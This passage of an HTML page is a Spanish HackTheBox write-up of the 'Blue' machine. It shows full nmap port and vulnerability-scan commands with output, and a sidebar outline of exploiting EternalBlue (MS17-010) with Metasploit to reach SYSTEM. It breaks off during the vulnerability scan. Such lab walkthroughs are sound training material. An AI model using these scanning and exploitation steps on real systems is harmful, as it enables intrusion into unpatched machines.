@@ -1,0 +1,1135 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Blue — HackTheBox Writeup | Brandeiks</title>
+  <meta name="description" content="Writeup de la máquina Blue de HackTheBox — Dificultad: Fácil. EternalBlue MS17-010 (CVE-2017-0144) → Metasploit → NT AUTHORITY\SYSTEM.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%2300ff88' rx='20'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' dy='.35em' font-size='70' font-weight='bold' fill='%23050a0e' font-family='monospace'%3EB%3C/text%3E%3C/svg%3E">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --bg:        #050a0e;
+      --bg2:       #080f14;
+      --bg3:       #0a1520;
+      --green:     #00ff88;
+      --cyan:      #00ff88;
+      --red:       #ff2d55;
+      --yellow:    #ffd700;
+      --orange:    #ff8c00;
+      --purple:    #bf5fff;
+      --blue:      #4fc3f7;
+      --dim:       #1a2a2e;
+      --text:      #c8d8e0;
+      --text-dim:  #4a6a74;
+      --font-mono: 'Share Tech Mono', monospace;
+      --font-main: 'Rajdhani', sans-serif;
+      --font-disp: 'Orbitron', sans-serif;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font-main);
+      overflow-x: hidden;
+      cursor: none;
+    }
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background: repeating-linear-gradient(
+        0deg, transparent, transparent 2px,
+        rgba(0,255,136,0.012) 2px, rgba(0,255,136,0.012) 4px
+      );
+      pointer-events: none; z-index: 1000;
+    }
+
+    /* CURSOR */
+    a, button { cursor: none; }
+    .cursor {
+      position: fixed; width: 10px; height: 10px;
+      background: var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9999;
+      transform: translate(-50%,-50%);
+      box-shadow: 0 0 12px var(--green); opacity: 0;
+    }
+    .cursor-ring {
+      position: fixed; width: 36px; height: 36px;
+      border: 1px solid var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9998;
+      transform: translate(-50%,-50%); opacity: 0;
+      transition: all 0.12s ease;
+    }
+
+    /* NAV */
+    nav {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 500;
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 1.2rem 4rem;
+      background: rgba(5,10,14,0.92); backdrop-filter: blur(10px);
+      border-bottom: 1px solid rgba(0,255,136,0.08);
+    }
+    .nav-logo { font-family: var(--font-disp); font-size: 1rem; color: var(--green); letter-spacing: 4px; text-decoration: none; }
+    .nav-back { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); text-decoration: none; letter-spacing: 2px; transition: color 0.3s; }
+    .nav-back::before { content: '← '; }
+    .nav-back:hover { color: var(--green); }
+
+    /* HERO */
+    .writeup-hero {
+      min-height: 42vh; display: flex; align-items: flex-end;
+      padding: 8rem 4rem 3rem; position: relative; overflow: hidden;
+      border-bottom: 1px solid var(--dim);
+    }
+    .hero-grid {
+      position: absolute; inset: 0;
+      background-image:
+        linear-gradient(rgba(0,255,136,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,255,136,0.03) 1px, transparent 1px);
+      background-size: 60px 60px;
+    }
+    .hero-glow {
+      position: absolute; width: 600px; height: 400px;
+      background: radial-gradient(ellipse, rgba(79,195,247,0.07) 0%, transparent 70%);
+      top: 0; left: 0; pointer-events: none;
+    }
+    .writeup-hero-content { position: relative; z-index: 2; max-width: 900px; }
+    .breadcrumb { font-family: var(--font-mono); font-size: 0.72rem; color: var(--text-dim); letter-spacing: 2px; margin-bottom: 1.2rem; }
+    .breadcrumb a { color: var(--text-dim); text-decoration: none; transition: color 0.2s; }
+    .breadcrumb a:hover { color: var(--green); }
+    .breadcrumb span { color: var(--green); }
+    .writeup-title { font-family: var(--font-disp); font-size: clamp(2.5rem, 6vw, 4.5rem); font-weight: 900; letter-spacing: 2px; line-height: 1.1; }
+    .writeup-title span { color: var(--green); }
+    .writeup-subtitle { font-family: var(--font-mono); font-size: 0.85rem; color: var(--text-dim); margin-top: 0.8rem; letter-spacing: 1px; }
+    .writeup-meta { display: flex; flex-wrap: wrap; gap: 1rem; align-items: center; margin-top: 1.8rem; }
+    .meta-badge { font-family: var(--font-mono); font-size: 0.68rem; letter-spacing: 2px; padding: 0.3rem 0.8rem; border: 1px solid; }
+    .badge-facil  { color: #00ffcc;  border-color: rgba(0,255,204,0.4);  background: rgba(0,255,204,0.05); }
+    .badge-htb    { color: var(--green);  border-color: rgba(0,255,136,0.3);  background: rgba(0,255,136,0.05); }
+    .badge-win    { color: var(--blue);  border-color: rgba(79,195,247,0.3);  background: rgba(79,195,247,0.05); }
+    .badge-cve    { color: var(--red);    border-color: rgba(255,45,85,0.4);   background: rgba(255,45,85,0.05); }
+    .badge-msf    { color: var(--purple); border-color: rgba(191,95,255,0.3);  background: rgba(191,95,255,0.05); }
+    .badge-nmap   { color: var(--orange); border-color: rgba(255,140,0,0.4);   background: rgba(255,140,0,0.05); }
+    .meta-date { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+
+    /* LAYOUT */
+    .writeup-layout {
+      display: grid; grid-template-columns: 1fr 240px;
+      gap: 3rem; max-width: 1300px; margin: 0 auto; padding: 4rem;
+    }
+
+    /* SIDEBAR */
+    .sidebar { position: sticky; top: 5rem; height: fit-content; order: 2; }
+    .sidebar-box { border: 1px solid var(--dim); padding: 1.5rem; background: var(--bg2); margin-bottom: 1.5rem; }
+    .sidebar-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--green); letter-spacing: 3px; margin-bottom: 1.2rem; }
+    .toc-list { list-style: none; display: flex; flex-direction: column; gap: 0.4rem; }
+    .toc-list a {
+      font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim);
+      text-decoration: none; letter-spacing: 1px; transition: all 0.2s;
+      display: block; padding: 0.25rem 0.8rem;
+      border-left: 2px solid transparent;
+    }
+    .toc-list a:hover { color: var(--green); border-left-color: var(--green); }
+    .toc-list a.active { color: var(--green); border-left-color: var(--green); opacity: 1; }
+    .info-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.8rem; }
+    .info-label { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); letter-spacing: 1px; }
+    .info-val { font-family: var(--font-mono); font-size: 0.72rem; }
+    .val-green  { color: var(--green); }
+    .val-blue   { color: var(--blue); }
+    .val-yellow { color: var(--yellow); }
+    .val-red    { color: var(--red); }
+    .val-facil  { color: #00ffcc; }
+
+    /* ATTACK PATH */
+    .attack-path { display: flex; flex-direction: column; gap: 0; }
+    .ap-item { display: flex; align-items: flex-start; gap: 0.8rem; padding: 0.5rem 0; }
+    .ap-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-top: 4px; flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
+    .ap-line { width: 1px; height: 16px; background: rgba(0,255,136,0.2); margin: 0 3.5px; }
+    .ap-text { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); line-height: 1.5; }
+    .ap-text span { color: var(--cyan); }
+
+    /* CONTENT */
+    .writeup-content { min-width: 0; order: 1; }
+
+    /* PROGRESS BAR */
+    .progress-container { position: fixed; top: 0; left: 0; width: 100%; height: 3px; background: transparent; z-index: 1001; }
+    .progress-bar { height: 100%; background: var(--green); width: 0%; transition: width 0.15s ease; box-shadow: 0 0 8px var(--green); }
+
+    /* SKIP LINK */
+    .skip-link { position: absolute; top: -40px; left: 0; background: var(--green); color: var(--bg); padding: 8px 16px; z-index: 10000; text-decoration: none; font-family: var(--font-mono); font-size: 0.8rem; transition: top 0.2s; }
+    .skip-link:focus { top: 0; }
+
+    /* COPY BUTTON */
+    .copy-btn {
+      position: absolute; top: 0.5rem; right: 4.5rem;
+      background: var(--dim); border: 1px solid rgba(0,255,136,0.3);
+      color: var(--text-dim); font-family: var(--font-mono);
+      font-size: 0.62rem; padding: 0.15rem 0.5rem; letter-spacing: 1px;
+      cursor: none; opacity: 0; transition: opacity 0.2s, background 0.2s, color 0.2s;
+      z-index: 10; white-space: nowrap;
+    }
+    .cmd-block:hover .copy-btn { opacity: 1; }
+    .copy-btn:hover { background: var(--green); color: var(--bg); border-color: var(--green); }
+    .copy-btn.copied { background: var(--green); color: var(--bg); border-color: var(--green); opacity: 1; }
+
+    /* TOAST */
+    .toast {
+      position: fixed; bottom: 24px; right: 24px;
+      background: var(--green); color: #000;
+      padding: 0.7rem 1.4rem; font-family: var(--font-mono);
+      font-size: 0.75rem; letter-spacing: 2px; font-weight: 600;
+      opacity: 0; transform: translateY(8px);
+      transition: opacity 0.25s, transform 0.25s;
+      pointer-events: none; z-index: 10000;
+    }
+    .toast.show { opacity: 1; transform: translateY(0); }
+
+    /* SECTIONS */
+    .section { margin-bottom: 4rem; opacity: 0; transform: translateY(20px); transition: opacity 0.5s ease, transform 0.5s ease; }
+    .section.visible { opacity: 1; transform: translateY(0); }
+    .section-label { font-family: var(--font-mono); font-size: 0.68rem; color: var(--green); letter-spacing: 4px; margin-bottom: 0.5rem; }
+    .section-title { font-family: var(--font-disp); font-size: 1.5rem; font-weight: 700; letter-spacing: 2px; margin-bottom: 0.6rem; }
+    .section-line { width: 40px; height: 2px; background: var(--green); margin-bottom: 2rem; }
+
+    /* PROSE */
+    .prose p { font-size: 1.05rem; line-height: 1.9; color: var(--text-dim); margin-bottom: 1rem; }
+    .prose p strong { color: var(--text); }
+    .prose p .hl       { color: var(--green); font-weight: bold; }
+    .prose p .hl-cyan  { color: var(--cyan); }
+    .prose p .hl-red   { color: var(--red); }
+    .prose p .hl-yel   { color: var(--yellow); }
+    .prose p .hl-pur   { color: var(--purple); }
+    .prose p .hl-blue  { color: var(--blue); }
+
+    /* STEP */
+    .step-marker { display: flex; align-items: center; gap: 1rem; margin-bottom: 1.2rem; margin-top: 2.5rem; }
+    .step-num { font-family: var(--font-disp); font-size: 0.65rem; color: var(--bg); background: var(--green); width: 26px; height: 26px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-weight: 900; }
+    .step-title { font-family: var(--font-mono); font-size: 0.8rem; color: var(--green); letter-spacing: 2px; }
+
+    /* CMD BLOCK */
+    .cmd-block {
+      background: var(--bg3); border: 1px solid rgba(0,229,255,0.15);
+      border-left: 3px solid var(--cyan); padding: 1rem 1.2rem;
+      margin: 1rem 0; font-family: var(--font-mono); font-size: 0.82rem;
+      overflow-x: auto; position: relative; line-height: 1.8;
+    }
+    .cmd-block .cmd-label { position: absolute; top: 0.5rem; right: 0.8rem; font-size: 0.6rem; color: var(--text-dim); letter-spacing: 2px; }
+    .cmd-block .prompt { color: var(--green); user-select: none; }
+    .cmd-block .cmd    { color: var(--text); }
+    .cmd-block .flag   { color: var(--cyan); }
+    .cmd-block .arg    { color: var(--yellow); }
+    .cmd-block .comment { color: var(--text-dim); font-size: 0.75rem; }
+
+    /* OUTPUT */
+    .output-block {
+      background: #020608; border: 1px solid var(--dim);
+      padding: 1rem 1.2rem; margin: 0.5rem 0 1.5rem;
+      font-family: var(--font-mono); font-size: 0.77rem;
+      line-height: 1.9; color: var(--text-dim); overflow-x: auto;
+    }
+    .output-block .o-green  { color: var(--green); }
+    .output-block .o-cyan   { color: var(--cyan); }
+    .output-block .o-red    { color: var(--red); }
+    .output-block .o-yellow { color: var(--yellow); }
+    .output-block .o-white  { color: var(--text); }
+    .output-block .o-purple { color: var(--purple); }
+    .output-block .o-blue   { color: var(--blue); }
+
+    /* INFO BOX */
+    .info-box { border: 1px solid rgba(0,229,255,0.2); background: rgba(0,229,255,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .info-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--cyan); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .info-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .info-box p strong { color: var(--cyan); }
+
+    .warn-box { border: 1px solid rgba(255,140,0,0.25); background: rgba(255,140,0,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .warn-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--orange); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .warn-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .warn-box p strong { color: var(--orange); }
+
+    .cve-box { border: 1px solid rgba(255,45,85,0.3); background: rgba(255,45,85,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .cve-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--red); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .cve-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .cve-box p strong { color: var(--red); }
+
+    /* VULN TABLE */
+    .vuln-table { width: 100%; border-collapse: collapse; margin: 1.5rem 0; }
+    .vuln-table th, .vuln-table td { font-family: var(--font-mono); font-size: 0.72rem; padding: 0.8rem 1rem; text-align: left; border-bottom: 1px solid var(--dim); }
+    .vuln-table th { color: var(--cyan); letter-spacing: 2px; border-bottom-color: rgba(0,229,255,0.2); }
+    .vuln-table td { color: var(--text-dim); }
+    .vuln-table td:first-child { color: var(--green); }
+
+    /* DIVIDER */
+    hr.divider { border: none; height: 1px; background: linear-gradient(90deg, rgba(0,255,136,0.3), transparent); margin: 3rem 0; }
+
+    /* CMD REF SECTION */
+    .cmd-ref-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.2rem; margin-top: 1.5rem; }
+    .cmd-ref-card { border: 1px solid var(--dim); background: var(--bg2); padding: 1.5rem; transition: border-color 0.3s; }
+    .cmd-ref-card:hover { border-color: rgba(0,229,255,0.25); }
+    .cmd-ref-name { font-family: var(--font-mono); font-size: 0.9rem; color: var(--cyan); margin-bottom: 0.5rem; letter-spacing: 1px; }
+    .cmd-ref-syntax { font-family: var(--font-mono); font-size: 0.72rem; color: var(--green); background: var(--bg3); padding: 0.4rem 0.7rem; margin-bottom: 0.8rem; display: inline-block; }
+    .cmd-ref-desc { font-size: 0.92rem; color: var(--text-dim); line-height: 1.7; margin-bottom: 0.8rem; }
+    .cmd-ref-flags { list-style: none; display: flex; flex-direction: column; gap: 0.3rem; }
+    .cmd-ref-flags li { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+    .cmd-ref-flags li span { color: var(--yellow); }
+
+    /* GLOSARIO */
+    .glosario-grid { display: grid; grid-template-columns: 1fr; gap: 1rem; margin-top: 1.5rem; }
+    .glos-card { border: 1px solid var(--dim); background: var(--bg2); padding: 1.4rem 1.5rem; transition: border-color 0.3s; }
+    .glos-card:hover { border-color: rgba(0,229,255,0.2); }
+    .glos-term { font-family: var(--font-mono); font-size: 0.88rem; color: var(--cyan); margin-bottom: 0.4rem; letter-spacing: 1px; }
+    .glos-def { font-size: 0.95rem; color: var(--text-dim); line-height: 1.75; }
+    .glos-def strong { color: var(--green); }
+    .glos-def code { color: var(--yellow); font-family: var(--font-mono); font-size: 0.85em; }
+
+    /* FLAGS SECTION */
+    .flags-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; margin-top: 1.5rem; }
+    .flag-card { border: 1px solid rgba(0,255,136,0.2); background: rgba(0,255,136,0.03); padding: 1.5rem; }
+    .flag-label { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); letter-spacing: 3px; margin-bottom: 0.5rem; }
+    .flag-user { font-family: var(--font-mono); font-size: 1rem; color: var(--green); word-break: break-all; }
+    .flag-root-card { border: 1px solid rgba(255,45,85,0.2); background: rgba(255,45,85,0.03); padding: 1.5rem; }
+    .flag-root { font-family: var(--font-mono); font-size: 1rem; color: var(--red); word-break: break-all; }
+
+    /* FOOTER */
+    footer { padding: 2rem 4rem; border-top: 1px solid var(--dim); display: flex; justify-content: space-between; align-items: center; margin-top: 4rem; }
+    footer p { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); letter-spacing: 1px; }
+    footer span { color: var(--green); }
+
+    @media (max-width: 960px) {
+      nav, .writeup-hero, footer { padding-left: 1.5rem; padding-right: 1.5rem; }
+      .writeup-layout { grid-template-columns: 1fr; padding: 2rem 1.5rem; }
+      .sidebar { position: static; }
+      .cmd-ref-grid, .flags-grid { grid-template-columns: 1fr; }
+      body, a, button { cursor: auto; }
+      .cursor, .cursor-ring { display: none; }
+    }
+  </style>
+</head>
+<body>
+
+<a href="#main-content" class="skip-link">Saltar al contenido principal</a>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+<div class="cursor" id="cursor"></div>
+<div class="cursor-ring" id="cursorRing"></div>
+
+<nav>
+  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+  <a href="../../index.html" class="nav-back">volver al portafolio</a>
+</nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <p class="breadcrumb">
+      <a href="../../index.html">brandeiks</a> /
+      <a href="../">writeups</a> /
+      <a href="../../writeups/hackthebox/">hackthebox</a> /
+      <span>blue</span>
+    </p>
+    <h1 class="writeup-title"><span>Blue</span></h1>
+    <p class="writeup-subtitle">HackTheBox — Windows · Nmap → EternalBlue MS17-010 (CVE-2017-0144) → Metasploit → NT AUTHORITY\SYSTEM</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-facil">● FÁCIL</span>
+      <span class="meta-badge badge-htb">HACKTHEBOX</span>
+      <span class="meta-badge badge-win">WINDOWS 7</span>
+      <span class="meta-badge badge-cve">CVE-2017-0144</span>
+      <span class="meta-badge badge-msf">METASPLOIT</span>
+      <span class="meta-badge badge-nmap">NMAP</span>
+      <span class="meta-date">📅 Junio 2026 · By Brandeiks</span>
+    </div>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="writeup-layout">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ÍNDICE</p>
+      <ul class="toc-list">
+        <li><a href="#resumen">01 · Resumen</a></li>
+        <li><a href="#reconocimiento">02 · Reconocimiento</a></li>
+        <li><a href="#vulnerabilidades">03 · Detección de Vulns</a></li>
+        <li><a href="#cve">04 · CVE-2017-0144</a></li>
+        <li><a href="#explotacion">05 · Explotación</a></li>
+        <li><a href="#postexplot">06 · Post-Explotación</a></li>
+        <li><a href="#flags">07 · Flags</a></li>
+        <li><a href="#referencia">08 · Referencia de Comandos</a></li>
+        <li><a href="#glosario">09 · Glosario</a></li>
+      </ul>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO</p>
+      <div class="info-row"><span class="info-label">Plataforma</span><span class="info-val val-green">HackTheBox</span></div>
+      <div class="info-row"><span class="info-label">OS</span><span class="info-val val-blue">Windows 7 SP1</span></div>
+      <div class="info-row"><span class="info-label">Dificultad</span><span class="info-val val-facil">Fácil</span></div>
+      <div class="info-row"><span class="info-label">IP Target</span><span class="info-val" style="color:var(--text)">10.129.2.134</span></div>
+      <div class="info-row"><span class="info-label">CVE</span><span class="info-val val-red">CVE-2017-0144</span></div>
+      <div class="info-row"><span class="info-label">Estado</span><span class="info-val val-green">● Pwned</span></div>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ATTACK PATH</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Nmap -sSCV</span> → puertos SMB abiertos</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>xsltproc</span> → reporte HTML</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Nmap --script vuln</span> → MS17-010 detectado</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>msfconsole</span> → EternalBlue module</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>set RHOST / LHOST</span> → config exploit</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>exploit</span> → shell Windows</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot" style="background:var(--red);box-shadow:0 0 6px var(--red)"></div><div class="ap-text"><span style="color:var(--red)">whoami</span> → NT AUTHORITY\SYSTEM</div></div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- CONTENT -->
+  <main class="writeup-content" id="main-content">
+
+    <!-- RESUMEN -->
+    <div class="section" id="resumen">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Resumen</h2>
+      <div class="section-line"></div>
+      <div class="prose">
+        <p>
+          <strong>Blue</strong> es una máquina de dificultad <span class="hl">fácil</span> de
+          <span class="hl-cyan">HackTheBox</span>, y una de las más icónicas de la plataforma.
+          Corre <strong>Windows 7 Professional 7601 Service Pack 1</strong> y es vulnerable a
+          <span class="hl-red">MS17-010 (CVE-2017-0144)</span>, la vulnerabilidad detrás del
+          famoso exploit <span class="hl-blue">EternalBlue</span>, filtrado por los Shadow Brokers
+          y usado masivamente en el ataque de ransomware <strong>WannaCry</strong> en 2017.
+        </p>
+        <p>
+          El ataque es directo: primero se hace un escaneo con <span class="hl-cyan">Nmap</span>
+          que revela el servicio SMB en el puerto 445. Un segundo scan con scripts de
+          vulnerabilidades confirma que la máquina es vulnerable a MS17-010. Luego se usa
+          <span class="hl-cyan">Metasploit Framework</span> con el módulo
+          <code style="color:var(--yellow)">exploit/windows/smb/ms17_010_eternalblue</code>
+          para obtener una shell directamente como
+          <span class="hl-red">NT AUTHORITY\SYSTEM</span> — el nivel más alto de privilegios en Windows.
+        </p>
+        <p>
+          No se requiere escalada de privilegios: EternalBlue da acceso total desde el primer momento.
+          Esta máquina es el escenario perfecto para entender por qué mantener los sistemas
+          actualizados es crítico para la seguridad.
+        </p>
+      </div>
+
+      <table class="vuln-table">
+        <thead>
+          <tr><th>Fase</th><th>Técnica / Herramienta</th><th>Resultado</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Escaneo inicial</td><td>nmap -p- -sSCV --min-rate=5000 -oX</td><td>Puertos SMB 135, 139, 445 abiertos — Windows 7</td></tr>
+          <tr><td>Reporte</td><td>xsltproc blue.xml</td><td>Reporte HTML visual del scan Nmap</td></tr>
+          <tr><td>Detección de vulns</td><td>nmap --script vuln</td><td>MS17-010 VULNERABLE — CVE-2017-0144</td></tr>
+          <tr><td>Investigación</td><td>CVE-2017-0144 (EternalBlue)</td><td>RCE crítico en SMBv1</td></tr>
+          <tr><td>Explotación</td><td>msfconsole ms17_010_eternalblue</td><td>Shell como NT AUTHORITY\SYSTEM</td></tr>
+          <tr><td>Post-explot.</td><td>whoami / dir / type</td><td>User flag + Root flag obtenidas</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <hr class="divider">
+
+    <!-- RECONOCIMIENTO -->
+    <div class="section" id="reconocimiento">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">Reconocimiento</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">ESCANEO COMPLETO CON NMAP</span>
+      </div>
+      <div class="prose">
+        <p>
+          Se lanza un escaneo completo de los <strong>65,535 puertos TCP</strong> contra el objetivo.
+          Las flags <span class="hl-cyan">-sSCV</span> activan el SYN scan sigiloso, la detección
+          de versión de servicios y los scripts de reconocimiento de Nmap. La flag
+          <span class="hl-cyan">--min-rate=5000</span> acelera el proceso forzando mínimo 5000 paquetes
+          por segundo. El resultado se exporta en XML con <span class="hl-cyan">-oX blue.xml</span>
+          para procesarlo después con xsltproc.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 10.129.2.134 -oX blue.xml">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">NMAP</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p- -sSCV -n -Pn</span> <span class="flag">--min-rate=5000 --open</span> <span class="arg">10.129.2.134</span> <span class="flag">-oX</span> <span class="arg">blue.xml</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-05 14:17 -0400</div>
+        <div>Nmap scan report for 10.129.2.134</div>
+        <div><span class="o-green">Host is up</span> (0.12s latency).</div>
+        <div>Not shown: 65526 closed tcp ports (reset)</div>
+        <div class="o-white">PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; STATE SERVICE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; VERSION</div>
+        <div><span class="o-blue">135/tcp   open  msrpc</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Microsoft Windows RPC</div>
+        <div><span class="o-blue">139/tcp   open  netbios-ssn</span>&nbsp; Microsoft Windows netbios-ssn</div>
+        <div><span class="o-yellow">445/tcp   open  microsoft-ds</span> Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)</div>
+        <div>49152/tcp open  msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Microsoft Windows RPC</div>
+        <div>49153/tcp open  msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Microsoft Windows RPC</div>
+        <div>49154/tcp open  msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Microsoft Windows RPC</div>
+        <div>49155/tcp open  msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Microsoft Windows RPC</div>
+        <div>49156/tcp open  msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Microsoft Windows RPC</div>
+        <div>49157/tcp open  msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Microsoft Windows RPC</div>
+        <div>&nbsp;</div>
+        <div>Host script results:</div>
+        <div>| smb2-security-mode:</div>
+        <div>|   2.1:</div>
+        <div>|_    Message signing enabled but not required</div>
+        <div>| smb-os-discovery:</div>
+        <div>|   OS: <span class="o-yellow">Windows 7 Professional 7601 Service Pack 1</span> (Windows 7 Professional 6.1)</div>
+        <div>|   Computer name: <span class="o-green">haris-PC</span></div>
+        <div>|   NetBIOS computer name: HARIS-PC\x00</div>
+        <div>|   Workgroup: WORKGROUP\x00</div>
+        <div>|_  System time: 2026-06-05T19:19:21+01:00</div>
+        <div>| smb-security-mode:</div>
+        <div>|   account_used: <span class="o-cyan">guest</span></div>
+        <div>|   authentication_level: user</div>
+        <div>|   challenge_response: supported</div>
+        <div>|_  <span class="o-red">message_signing: disabled (dangerous, but default)</span></div>
+        <div>&nbsp;</div>
+        <div>Nmap done: 1 IP address (1 host up) scanned in 91.06 seconds</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// ANÁLISIS DEL SCAN</p>
+        <p>Nmap revela un sistema <strong>Windows 7 Professional SP1</strong> con SMB expuesto en el puerto <strong>445</strong>. Puntos clave: el <strong>message signing está deshabilitado</strong> (peligroso), la cuenta <strong>guest</strong> está activa, y el nombre del equipo es <strong>haris-PC</strong>. Todo indica un Windows sin parchar — candidato perfecto para EternalBlue.</p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">CONVERSIÓN DEL REPORTE NMAP A HTML</span>
+      </div>
+      <div class="prose">
+        <p>
+          Se convierte el XML generado por Nmap a un reporte HTML visual usando
+          <strong>xsltproc</strong> con la hoja de estilos oficial de Nmap. El resultado
+          es un archivo <span class="hl">blue.html</span> que presenta el scan de forma
+          organizada y legible en cualquier navegador — útil para documentar y revisar el reporte.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="xsltproc /usr/share/nmap/nmap.xsl blue.xml > blue.html">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">XSLTPROC</span>
+        <div><span class="prompt">$ </span><span class="cmd">xsltproc <span class="arg">/usr/share/nmap/nmap.xsl</span> <span class="arg">blue.xml</span> &gt; <span class="arg">blue.html</span></span></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- VULNERABILIDADES -->
+    <div class="section" id="vulnerabilidades">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">Detección de Vulnerabilidades</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">3</div>
+        <span class="step-title">NMAP SCRIPT VULN — MS17-010 DETECTADO</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con los puertos identificados, se lanza un segundo scan específico usando los scripts
+          de vulnerabilidades de Nmap con <span class="hl-cyan">--script vuln</span>. Esto ejecuta
+          una batería de scripts NSE (Nmap Scripting Engine) que comprueban vulnerabilidades conocidas
+          contra los servicios detectados. Se apuntan solo los puertos relevantes para reducir el tiempo.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo nmap -p 135,139,445,49152,49153,49154,49155,49156,49157 --script vuln --open 10.129.2.134 -oX blue_vuln.xml">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
